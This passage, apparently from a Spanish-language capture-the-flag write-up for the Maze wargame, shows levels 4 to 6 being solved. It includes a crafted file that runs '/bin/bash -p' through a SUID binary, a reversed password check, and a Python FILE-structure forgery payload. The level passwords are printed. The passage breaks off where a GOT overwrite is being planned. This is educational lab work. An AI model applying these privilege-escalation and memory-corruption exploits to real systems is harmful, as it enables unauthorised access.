leave 0x08048722 \u0026lt;+295\u0026gt;: ret End of assembler dump. (gdb) break *0x0804869e Breakpoint 1 at 0x804869e: file maze4.c, line 50. (gdb) x/16x $esp 0xffffd62c: 0x00000003 0x48484848 0x00000000 0x0000fb03 0xffffd63c: 0x00000000 0x00000000 0x00000201 0x000081ed 0xffffd64c: 0x00000001 0x00003a9c 0x00000000 0x00000000 0xffffd65c: 0x00000000 0xffff0000 0x00000069 0x00001000  Observamos que el segundo argumento de lseek es 0x48484848 (HHHH). Esta función pondrá un puntero para leer el archivo en el carácter que está en la posición 0x48484848 (que es inválida, evidentemente). Una vez que el puntero está configurado, el programa leerá otra vez el archivo pero empezando desde la posición indicada por lseek.\nLa idea es llenar el archivo con datos cualesquiera hasta la posición donde tenemos ahora HHHH. Luego ponemos 0x20 para hacer que lseek ponga le puntero despues de HHHH:\nmaze4@maze:~$ python3 -c 'print(\"A\" * 28 + \"\\x20\\0\\0\\0\" + \"\".join(chr(c) * 4 for c in range(0x41, 0x5b)))' AAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ maze4@maze:~$ python3 -c 'print(\"A\" * 28 + \"\\x20\\0\\0\\0\" + \"\".join(chr(c) * 4 for c in range(0x41, 0x5b)))' \u0026lt; /tmp/file maze4@maze:~$ xxd /tmp/file 00000000: 4141 4141 4141 4141 4141 4141 4141 4141 AAAAAAAAAAAAAAAA 00000010: 4141 4141 4141 4141 4141 4141 2000 0000 AAAAAAAAAAAA ... 00000020: 4141 4141 4242 4242 4343 4343 4444 4444 AAAABBBBCCCCDDDD 00000030: 4545 4545 4646 4646 4747 4747 4848 4848 EEEEFFFFGGGGHHHH 00000040: 4949 4949 4a4a 4a4a 4b4b 4b4b 4c4c 4c4c IIIIJJJJKKKKLLLL 00000050: 4d4d 4d4d 4e4e 4e4e 4f4f 4f4f 5050 5050 MMMMNNNNOOOOPPPP 00000060: 5151 5151 5252 5252 5353 5353 5454 5454 QQQQRRRRSSSSTTTT 00000070: 5555 5555 5656 5656 5757 5757 5858 5858 UUUUVVVVWWWWXXXX 00000080: 5959 5959 5a5a 5a5a 0a YYYYZZZZ.  Ahora, ponemos un breakpoint en las instrucciones de comparación (donde está el bloque if en el código fuente descompilado):\nmaze4@maze:~$ gdb -q /maze/maze4 Reading symbols from /maze/maze4...done. (gdb) break *0x080486cb Breakpoint 1 at 0x80486cb: file maze4.c, line 54. (gdb) break *0x080486d5 Breakpoint 2 at 0x80486d5: file maze4.c, line 54. (gdb) run /tmp/file Starting program: /maze/maze4 /tmp/file Breakpoint 1, 0x080486cb in main (argc=2, argv=0xffffd784) at maze4.c:54 54 maze4.c: No such file or directory. (gdb) x/i $eip =\u0026gt; 0x80486cb \u0026lt;main+208\u0026gt;: cmp %edx,%eax (gdb) info registers eax 0x44444444 1145324612 ecx 0x41 65 edx 0x1081 4225 ebx 0x0 0 esp 0xffffd638 0xffffd638 ebp 0xffffd6e8 0xffffd6e8 esi 0x2 2 edi 0xf7fc5000 -134459392 eip 0x80486cb 0x80486cb \u0026lt;main+208\u0026gt; eflags 0x292 [ AF SF IF ] cs 0x23 35 ss 0x2b 43 ds 0x2b 43 es 0x2b 43 fs 0x0 0 gs 0x63 99  Aquí vemos que donde tenemos 0x44444444 (DDDD) el programa espera 0x1081. Vamos a corregirlo desde GDB y continuamos:\n(gdb) set $eax = 0x1081 (gdb) continue Continuing. Breakpoint 2, main (argc=2, argv=0xffffd784) at maze4.c:54 54 in maze4.c (gdb) x/i $eip =\u0026gt; 0x80486d5 \u0026lt;main+218\u0026gt;: cmp $0x77,%eax (gdb) p/x $eax $2 = 0x89  Esta vez, 0x89 es el tamaño del archivo. Por tanto, necesitamos un archivo cuyo tamaño sea 0x78 (aunque el archivo puede ser más pequeño). Después de estas comprobaciones, el archivo será ejecutado mediante execve.\nEste es un archivo válido y que cumple todas las validaciones:\nmaze4@maze:~$ python3 -c 'import os; os.write(1, b\"A\" * 28 + b\"\\x20\\0\\0\\0\" + b\"B\" * 12 + b\"\\x81\\x10\\0\\0\" + b\"C\" * 32 + b\"\\n\")' \u0026lt; /tmp/file maze4@maze:~$ xxd /tmp/file 00000000: 4141 4141 4141 4141 4141 4141 4141 4141 AAAAAAAAAAAAAAAA 00000010: 4141 4141 4141 4141 4141 4141 2000 0000 AAAAAAAAAAAA ... 00000020: 4242 4242 4242 4242 4242 4242 8110 0000 BBBBBBBBBBBB.... 00000030: 4343 4343 4343 4343 4343 4343 4343 4343 CCCCCCCCCCCCCCCC 00000040: 4343 4343 4343 4343 4343 4343 4343 4343 CCCCCCCCCCCCCCCC 00000050: 0a .  Ahora necesitamos modificar los datos iniciales para que el archivo sea válido para ejecutarse también. Por ejemplo, podemos usar este:\nmaze4@maze:~$ python3 -c 'import os; os.write(1, b\"#!/bin/sh\\n\\n/bin/bash -p # \" + b\"\\x20\\0\\0\\0\" + b\"B\" * 12 + b\"\\xb8\\x2e\\0\\0\" + b\"C\" * 32 + b\"\\n\")' \u0026lt; /tmp/file maze4@maze:~$ xxd /tmp/file 00000000: 2321 2f62 696e 2f73 680a 0a2f 6269 6e2f #!/bin/sh../bin/ 00000010: 6261 7368 202d 7020 2020 2320 2000 0000 bash -p # ... 00000020: 4242 4242 4242 4242 4242 4242 b82e 0000 BBBBBBBBBBBB.... 00000030: 4343 4343 4343 4343 4343 4343 4343 4343 CCCCCCCCCCCCCCCC 00000040: 4343 4343 4343 4343 4343 4343 4343 4343 CCCCCCCCCCCCCCCC 00000050: 0a .  Básicamente, se trata de un shell script que utiliza un shebang para especificar que el archivo sea ehecutado con /bin/sh, luego utilizamos /bin/bash -p para que se utilice el privilegio SUID del binario. Nótese que # es un comentario en shell scripting:\nmaze4@maze:~$ cat /tmp/file #!/bin/sh /bin/bash -p # BBBBBBBBBBBB?.CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC  Ahora lo ejecutamos y terminamos el nivel:\nmaze4@maze:~$ /maze/maze4 /tmp/file valid file, executing bash-4.4$ whoami maze5 bash-4.4$ cat /etc/maze_pass/maze5 ishipaeroo  Nivel 5 -\u0026gt; 6 Para este nivel, tenemos un binario /maze/maze5 que podemos descompilar con Ghidra y obtener la función main:\nint main() { size_t sVar1; long lVar2; int iVar3; char pass[9]; char user[9]; puts(\"X----------------\"); printf(\" Username: \"); __isoc99_scanf(\"%8s\", user); printf(\" Key: \"); __isoc99_scanf(\"%8s\", pass); sVar1 = strlen(user); if ((sVar1 == 8) \u0026amp;\u0026amp; (sVar1 = strlen(pass), sVar1 == 8)) { lVar2 = ptrace(PTRACE_TRACEME, 0, 0, 0); if (lVar2 == 0) { iVar3 = foo(user, pass); if (iVar3 == 0) { puts(\"\\nNah, wrong.\"); } else { puts(\"\\nYeh, here\\'s your shell\"); system(\"/bin/sh\"); } } else { puts(\"\\nnahnah...\"); } return 0; } puts(\"Wrong length you!\"); /* WARNING: Subroutine does not return */ exit(-1); }  Básicamente, el programa pide un nombre y una contraseña, Además, no permite el uso de GDB, strace o ltrace porque ptrace no devolverá 0.\nDespués, el nombre de usuario y la contraseña son enviados a foo (solamente si los dos tienen una longitud de 8 bytes):\nint foo(char *s, char *a) { int iVar1; int iVar2; size_t sVar3; char cStack22; char p[9]; int x; int i; p._0_4_ = 0x6e697270; p._4_4_ = 0x6c6f6c74; p[8] = '\\0'; for (i = 0; sVar3 = strlen(s), (uint)i \u0026lt; sVar3; i = i + 1) { p[i] = p[i] - (s[i] + -0x41 + (char)i * '\\x02'); } do { iVar1 = i + -1; if (i == 0) { return 1; } iVar2 = i + -1; i = iVar1; } while (p[iVar2] == a[iVar1]); return 0; }  El código descompilado es un poco extraño. El bucle for está realizando operaciones sobre el nombre de usuario con una clave que es printlol (0x6e697270 y 0x6c6f6c74 pasados a formato bytes). Luego, el bucle do-while solamente verifica que la contraseña es igual al resultado de la operación anterior (carácter a carácter).\nPor tanto, podemos reescribir este bucle for en otro archivo para obtener la contraseña esperada:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; void main(int argc, char** argv) { if (argc != 2) return; int i; char* key = \"printlol\"; char* username = argv[1]; char password[8]; printf(\"Key: %s\\n\", key); printf(\"Username: %s\\n\", username); for (i = 0; i \u0026lt; 8; i++) { password[i] = key[i] - (username[i] - 0x41 + i * 2); } printf(\"Expected password: %s\\n\", password); }  Ahora lo compilamos y ejecutamos pasándole un usuario como argumento:\n$ gcc -o password password.c $ ./password AAAAAAAA Key: printlol Username: AAAAAAAA Expected password: ppehlbc^  Y por tanto, podemos utilizar el programa para obtener una shell como maze6:\nmaze5@maze:~$ /maze/maze5 X---------------- Username: AAAAAAAA Key: ppehlbc^ Yeh, here's your shell $ whoami maze6 $ cat /etc/maze_pass/maze6 epheghuoli  Nivel 6 -\u0026gt; 7 El código fuente descompilado de /maze/maze6 se muestra a continuación:\nint main(int argc, char **argv) { FILE *__stream; size_t __n; char buf[256]; FILE *fp; if (argc != 3) { printf(\"%s file2write2 string\\n\", *argv); /* WARNING: Subroutine does not return */ exit(-1); } __stream = fopen(argv[1], \"a\"); if (__stream == (FILE *) 0x0) { perror(\"fopen\"); /* WARNING: Subroutine does not return */ exit(-1); } strcpy(buf, argv[2]); __n = strlen(buf); memfrob(buf, __n); fprintf(__stream, \"%s : %s\\n\", argv[1], buf); /* WARNING: Subroutine does not return */ exit(0); } Primero, nos damos cuenta del uso de strcpy, que es vulnerable a Buffer Overflow ya que podemos controlar el contenido de la string de origen, que será copiada a la variable destino buf, que solamente tiene 256 bytes reservados.\nDesafortunadamente, no existe instrucción de retorno que podamos sobrescribir, por lo que el Buffer Overflow no será útil para controlar la ejecución del programa.\nAdemás, después de strcpy, los datos copiados en buf son modificados por memfrob. Esta función cifra cada byte utilizando una operación XOR con 42 (0x2a) como clave. Esto se debe tener en cuenta porque crearemos un payload y lo cifraremos con una clave 42 y XOR, de manera que memfrob revierte nuestro cifrado y copiamos los datos que queremos. Además, esta metodología nos permitirá enviar bytes nulos (si no, strcpy no funcionaría como esperamos porque los bytes nulos terminan las cadenas de caracteres en C).\nComo no podemos sobrescribir la dirección de retorno, necesitamos modificar variables locales (que se almacenan en la pila). La única que importa es la que apunta a la estructura FILE, por lo que este es el camino.\nUna búsqueda rápida en Internet nos muestra una técnica llamada File Stream Oriented Programming (FSOP), que consiste en falsificar una estructura FILE para conseguir una primitiva de escritura. Existe bastante información al respecto.\nPrimero de todo, ejecutemos el programa:\nmaze6@maze:~$ /maze/maze6 /maze/maze6 file2write2 string maze6@maze:~$ /maze/maze6 file.txt AAAA fopen: Permission denied maze6@maze:~$ cd /tmp maze6@maze:/tmp$ echo AAAA  asdf.txt maze6@maze:/tmp$ /maze/maze6 asdf.txt AAAA fopen: Permission denied  Este comportamiento es extraño. Parece que el programa no tiene los permisos suficientes para escribir datos en asdf.txt. Comprobemos los permisos:\nmaze6@maze:/tmp$ ls -l --time-style=+ asdf.txt -rw-r--r-- 1 maze6 root 5 asdf.txt  Aquí está, como /maze/maze6 es un binario SUID, se está ejecutando como usuario maze7, pero el archivo asdf.txt pertenece a maze6 y otros solamente pueden leer. Por tanto, Tenemos que cambiar sus permisos para que sean al menos rw:\nmaze6@maze:/tmp$ chmod 666 asdf.txt maze6@maze:/tmp$ ls -l --time-style=+ asdf.txt -rw-rw-rw- 1 maze6 root 5 asdf.txt maze6@maze:/tmp$ /maze/maze6 asdf.txt AAAA maze6@maze:/tmp$ cat asdf.txt AAAA asdf.txt : kkkk  Ahora todo funciona correctamente y podemos empezar a trabajar.\nPara poder resolver este nivel, ponemos un breakpoint antes de fprintf y examinamos la estructura FILE legítima desde la máquina remota. Curiosamente, GDB ha cambiado su interfaz. Esta vez, usaré gdb-peda (solo porque gef no está instalado y pwndbg no funciona correctamente):\nmaze6@maze:/tmp$ gdb -q /maze/maze6 Reading symbols from /maze/maze6...done. warning: ~/.gdbinit.local: No such file or directory gdb$ source /usr/local/peda/peda.py gdb-peda$  Desensamblamos la función main y ponemos el breakpoint justo antes de la llamada a fprintf:\ngdb-peda$ disassemble main Dump of assembler code for function main: 0x0804855b \u0026lt;+0\u0026gt;: push ebp 0x0804855c \u0026lt;+1\u0026gt;: mov ebp,esp 0x0804855e \u0026lt;+3\u0026gt;: sub esp,0x104 ... 0x08048606 \u0026lt;+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt; 0x0804860b \u0026lt;+176\u0026gt;: add esp,0x10 0x0804860e \u0026lt;+179\u0026gt;: push 0x0 0x08048610 \u0026lt;+181\u0026gt;: call 0x80483f0 \u0026lt;exit@plt\u0026gt; End of assembler dump. gdb-peda$ break *0x08048606 Breakpoint 1 at 0x8048606: file maze6.c, line 40.  Ahora podemos lanzar el programa:\ngdb-peda$ run asdf.txt AAAA Starting program: /maze/maze6 asdf.txt AAAA [----------------------------------registers-----------------------------------] EAX: 0xffffd7cd (\"asdf.txt\") EBX: 0x0 ECX: 0xffffd4d8 --\u0026gt; 0x0 EDX: 0xffffd4d4 (\"kkkk\") ESI: 0x3 EDI: 0xf7fc5000 --\u0026gt; 0x1b2db0 EBP: 0xffffd5d8 --\u0026gt; 0x0 ESP: 0xffffd4c4 --\u0026gt; 0x804a008 --\u0026gt; 0xfbad3484 EIP: 0x8048606 (\u0026lt;main+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt;) EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80485fd \u0026lt;main+162\u0026gt;: push eax 0x80485fe \u0026lt;main+163\u0026gt;: push 0x80486bf 0x8048603 \u0026lt;main+168\u0026gt;: push DWORD PTR [ebp-0x4] =\u0026gt; 0x8048606 \u0026lt;main+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt; 0x804860b \u0026lt;main+176\u0026gt;: add esp,0x10 0x804860e \u0026lt;main+179\u0026gt;: push 0x0 0x8048610 \u0026lt;main+181\u0026gt;: call 0x80483f0 \u0026lt;exit@plt\u0026gt; 0x8048615: xchg ax,ax Guessed arguments: arg[0]: 0x804a008 --\u0026gt; 0xfbad3484 arg[1]: 0x80486bf (\"%s : %s\\n\") arg[2]: 0xffffd7cd (\"asdf.txt\") arg[3]: 0xffffd4d4 (\"kkkk\") [------------------------------------stack-------------------------------------] 0000| 0xffffd4c4 --\u0026gt; 0x804a008 --\u0026gt; 0xfbad3484 0004| 0xffffd4c8 --\u0026gt; 0x80486bf (\"%s : %s\\n\") 0008| 0xffffd4cc --\u0026gt; 0xffffd7cd (\"asdf.txt\") 0012| 0xffffd4d0 --\u0026gt; 0xffffd4d4 (\"kkkk\") 0016| 0xffffd4d4 (\"kkkk\") 0020| 0xffffd4d8 --\u0026gt; 0x0 0024| 0xffffd4dc --\u0026gt; 0xf7ff1781 (add esp,0x10) 0028| 0xffffd4e0 --\u0026gt; 0xf7ff215c (add esi,0xaea4) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0x08048606 in main (argc=0x3, argv=0xffffd674) at maze6.c:40 40 maze6.c: No such file or directory.  En este punto, vemos que el puntero a la estructura FILE es 0x804a008 (el primer argumento de fprintf). Podemos extraer los atributos de esta estructura como sigue:\ngdb-peda$ p *((FILE*) 0x804a008) $1 = { _flags = 0xfbad3484, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0xf7fc5cc0 \u0026lt;_IO_2_1_stderr_\u0026gt;, _fileno = 0x3, _flags2 = 0x0, _old_offset = 0x0, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = \"\", _lock = 0x804a0a0, _offset = 0xffffffffffffffff, __pad1 = 0x0, __pad2 = 0x804a0ac, __pad3 = 0x0, __pad4 = 0x0, __pad5 = 0x0, _mode = 0x0, _unused2 = '\\000' \u0026lt;repeats 39 times\u0026gt; }  Algunos atributos importantes para considerar son:\n _chain = 0xf7fc5cc0 _lock = 0x804a0a0 _offset = 0xffffffffffffffff  Existe una clase en pwntools llamada FileStructure que parece interesante, pero no conseguí que funcionara correctamente.\nTambién, tenemos qaue chequear los tipos de atributos de la estructura FILE y cómo se almacena en memoria:\ngdb-peda$ ptype FILE type = struct _IO_FILE { int _flags; char *_IO_read_ptr; char *_IO_read_end; char *_IO_read_base; char *_IO_write_base; char *_IO_write_ptr; char *_IO_write_end; char *_IO_buf_base; char *_IO_buf_end; char *_IO_save_base; char *_IO_backup_base; char *_IO_save_end; struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; int _flags2; __off_t _old_offset; unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; _IO_lock_t *_lock; __off64_t _offset; void *__pad1; void *__pad2; void *__pad3; void *__pad4; size_t __pad5; int _mode; char _unused2[40]; } gdb-peda$ x/40x 0x804a008 0x804a008: 0xfbad3484 0x00000000 0x00000000 0x00000000 0x804a018: 0x00000000 0x00000000 0x00000000 0x00000000 0x804a028: 0x00000000 0x00000000 0x00000000 0x00000000 0x804a038: 0x00000000 0xf7fc5cc0 0x00000003 0x00000000 0x804a048: 0x00000000 0x00000000 0x0804a0a0 0xffffffff 0x804a058: 0xffffffff 0x00000000 0x0804a0ac 0x00000000 0x804a068: 0x00000000 0x00000000 0x00000000 0x00000000 0x804a078: 0x00000000 0x00000000 0x00000000 0x00000000 0x804a088: 0x00000000 0x00000000 0x00000000 0x00000000 0x804a098: 0x00000000 0xf7fc3960 0x00000000 0x00000000  Existe otro valor relevante aquí: vtable, que es 0xf7fc3960.\nPara conseguir escritura arbitraria en la memoria, necesitamos controlar los atributos _IO_buf_base y _IO_buf_end, de manera que estos atributos apunten a las direcciones de inicio y fin de donde queremos escribir (la longitud será _IO_buf_end - _IO_buf_base).\nComo disponemos de una vulnerabilidad de Buffer Overflow, somos capaces de modificar el puntero de la estructura FILE legítima y hacer que apunte a una maliciosa cargada en la pila.\nPara ello, necesitamos calcular el offset necesario para sobrescribir el primer argumento de fprintf. Esto puede hacerse con cyclic de pwntools (utilizamos el cifrado XOR para poder calcular el offset después):\ngdb-peda$ run asdf.txt \"$(python -c 'from pwn import cyclic; print(\"\".join(chr(42 ^ ord(b)) for b in cyclic(270)))')\" Starting program: /maze/maze6 asdf.txt \"$(python -c 'from pwn import cyclic; print(\"\".join(chr(42 ^ ord(b)) for b in cyclic(270)))')\" [----------------------------------registers-----------------------------------] EAX: 0xffffd6c3 (\"asdf.txt\") EBX: 0x0 ECX: 0xffffd4d2 --\u0026gt; 0xd5640000 EDX: 0xffffd3c4 (\"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\"...) ESI: 0x3 EDI: 0xf7fc5000 --\u0026gt; 0x1b2db0 EBP: 0xffffd4c8 (\"paacqaacra\") ESP: 0xffffd3b4 (\"oaac\\277\\206\\004\\b\\303\\326\\377\\377\\304\\323\\377\\377aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaab\"...) EIP: 0x8048606 (\u0026lt;main+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt;) EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80485fd \u0026lt;main+162\u0026gt;: push eax 0x80485fe \u0026lt;main+163\u0026gt;: push 0x80486bf 0x8048603 \u0026lt;main+168\u0026gt;: push DWORD PTR [ebp-0x4] =\u0026gt; 0x8048606 \u0026lt;main+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt; 0x804860b \u0026lt;main+176\u0026gt;: add esp,0x10 0x804860e \u0026lt;main+179\u0026gt;: push 0x0 0x8048610 \u0026lt;main+181\u0026gt;: call 0x80483f0 \u0026lt;exit@plt\u0026gt; 0x8048615: xchg ax,ax Guessed arguments: arg[0]: 0x6361616f ('oaac') arg[1]: 0x80486bf (\"%s : %s\\n\") arg[2]: 0xffffd6c3 (\"asdf.txt\") arg[3]: 0xffffd3c4 (\"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\"...) [------------------------------------stack-------------------------------------] 0000| 0xffffd3b4 (\"oaac\\277\\206\\004\\b\\303\\326\\377\\377\\304\\323\\377\\377aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaab\"...) 0004| 0xffffd3b8 --\u0026gt; 0x80486bf (\"%s : %s\\n\") 0008| 0xffffd3bc --\u0026gt; 0xffffd6c3 (\"asdf.txt\") 0012| 0xffffd3c0 --\u0026gt; 0xffffd3c4 (\"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\"...) 0016| 0xffffd3c4 (\"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\"...) 0020| 0xffffd3c8 (\"baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaac\"...) 0024| 0xffffd3cc (\"caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaac\"...) 0028| 0xffffd3d0 (\"daaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaac\"...) [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0x08048606 in main (argc=0x6172, argv=0xffffd564) at maze6.c:40 40 in maze6.c  Y el primer parámetro se sobrescribe con \u0026quot;oaac\u0026quot;, que resulta en un offset de 256 bytes:\n$ pwn cyclic -l oaac 256  Nótese que el patrón se almacena en la pila 16 bytes después del offset:\ngdb-peda$ x/50x $esp 0xffffd3b4: 0x6361616f 0x080486bf 0xffffd6c3 0xffffd3c4 0xffffd3c4: 0x61616161 0x61616162 0x61616163 0x61616164 0xffffd3d4: 0x61616165 0x61616166 0x61616167 0x61616168 0xffffd3e4: 0x61616169 0x6161616a 0x6161616b 0x6161616c 0xffffd3f4: 0x6161616d 0x6161616e 0x6161616f 0x61616170 0xffffd404: 0x61616171 0x61616172 0x61616173 0x61616174 0xffffd414: 0x61616175 0x61616176 0x61616177 0x61616178 0xffffd424: 0x61616179 0x6261617a 0x62616162 0x62616163 0xffffd434: 0x62616164 0x62616165 0x62616166 0x62616167 0xffffd444: 0x62616168 0x62616169 0x6261616a 0x6261616b 0xffffd454: 0x6261616c 0x6261616d 0x6261616e 0x6261616f 0xffffd464: 0x62616170 0x62616171 0x62616172 0x62616173 0xffffd474: 0x62616174 0x62616175  Por tanto, en lugar de \u0026quot;oaac\u0026quot;, podemos poner 0xffffd3c4 para que la estructura FILE comience ahí y el primer argumento de fprintf apunte a esa dirección en la pila.\nAhora construimos la estructura FILE maliciosa para poder cargarla en la pila. De momento, vamos a tratar de sobrescribir una variable de entorno, por ejemplo USER=maze6):\ngdb-peda$ shell echo $USER maze6 gdb-peda$ find USER Searching for 'USER' in: None ranges Found 1 results, display max 1 items: [stack] : 0xffffde6d (\"USER=maze6\")  Por tanto, estos serán los valores para la estructura FILE:\n _chain = 0xf7fc5cc0 _lock = 0x804a0a0 _offset = 0xffffffffffffffff vtable = 0xf7fc3960 _IO_buf_base = 0xffffde6d _IO_buf_end = 0xffffde6d + 4  Después de algunas pruebas, podemos desarrollar este script en Python que pone estos campos en un payload:\n#!/usr/bin/env python3 import os import struct env_addr = 0xffffde6d file_addr = 0xffffd3c8 length = 256 p32 = lambda h: struct.pack('\u0026lt;I', h) payload = b'ASDF' payload += b'\\0' * 28 payload += p32(env_addr) payload += p32(env_addr + 4) payload += b'\\0' * 16 payload += p32(0xf7fc5cc0) payload += b'\\0' * 16 payload += p32(0x0804a0a0) payload += b'\\xff' * 8 payload += b'\\0' * 64 payload += p32(0xf7fc3960) payload += b'\\0' * (length - len(payload)) payload += p32(file_addr) os.write(1, bytes(42 ^ b for b in payload))  Ahora podemos comprobar que todos los valores cargados son los esperados mirándolo en GDB:\ngdb-peda$ run asdf.txt \"$(python3 maze6.py)\" Starting program: /maze/maze6 asdf.txt \"$(python3 maze6.py)\" [----------------------------------registers-----------------------------------] EAX: 0xffffd6cd (\"asdf.txt\") EBX: 0x0 ECX: 0xffffd4d8 --\u0026gt; 0x0 EDX: 0xffffd3d4 (\"ASDF\") ESI: 0x3 EDI: 0xf7fc5000 --\u0026gt; 0x1b2db0 EBP: 0xffffd4d8 --\u0026gt; 0x0 ESP: 0xffffd3c4 --\u0026gt; 0xffffd3d8 --\u0026gt; 0x0 EIP: 0x8048606 (\u0026lt;main+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt;) EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80485fd \u0026lt;main+162\u0026gt;: push eax 0x80485fe \u0026lt;main+163\u0026gt;: push 0x80486bf 0x8048603 \u0026lt;main+168\u0026gt;: push DWORD PTR [ebp-0x4] =\u0026gt; 0x8048606 \u0026lt;main+171\u0026gt;: call 0x8048420 \u0026lt;fprintf@plt\u0026gt; 0x804860b \u0026lt;main+176\u0026gt;: add esp,0x10 0x804860e \u0026lt;main+179\u0026gt;: push 0x0 0x8048610 \u0026lt;main+181\u0026gt;: call 0x80483f0 \u0026lt;exit@plt\u0026gt; 0x8048615: xchg ax,ax Guessed arguments: arg[0]: 0xffffd3d8 --\u0026gt; 0x0 arg[1]: 0x80486bf (\"%s : %s\\n\") arg[2]: 0xffffd6cd (\"asdf.txt\") arg[3]: 0xffffd3d4 (\"ASDF\") [------------------------------------stack-------------------------------------] 0000| 0xffffd3c4 --\u0026gt; 0xffffd3d8 --\u0026gt; 0x0 0004| 0xffffd3c8 --\u0026gt; 0x80486bf (\"%s : %s\\n\") 0008| 0xffffd3cc --\u0026gt; 0xffffd6cd (\"asdf.txt\") 0012| 0xffffd3d0 --\u0026gt; 0xffffd3d4 (\"ASDF\") 0016| 0xffffd3d4 (\"ASDF\") 0020| 0xffffd3d8 --\u0026gt; 0x0 0024| 0xffffd3dc --\u0026gt; 0x0 0028| 0xffffd3e0 --\u0026gt; 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0x08048606 in main (argc=0x3, argv=0xffffd574) at maze6.c:40 40 in maze6.c gdb-peda$ p *((FILE*) 0xffffd3d8) $3 = { _flags = 0x0, _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0xffffde6d \"USER=maze6\", _IO_buf_end = 0xffffde74 \"ze6\", _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0xf7fc5cc0 \u0026lt;_IO_2_1_stderr_\u0026gt;, _fileno = 0x0, _flags2 = 0x0, _old_offset = 0x0, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = \"\", _lock = 0x804a0a0, _offset = 0xffffffffffffffff, __pad1 = 0x0, __pad2 = 0x0, __pad3 = 0x0, __pad4 = 0x0, __pad5 = 0x0, _mode = 0x0, _unused2 = '\\000' \u0026lt;repeats 39 times\u0026gt; }  Y parece que todo está correcto. Si continuamos, vemos que el valor cambia:\ngdb-peda$ x/s 0xffffde6d 0xffffde6d: \"USER=maze6\" gdb-peda$ next asdf.txt : ASDF ... gdb-peda$ x/s 0xffffde6d 0xffffde6d: \" : ASDFze6\"  En este punto, la idea es sobrescribir el valor de exit en la Tabla de Offsets Globales (GOT) 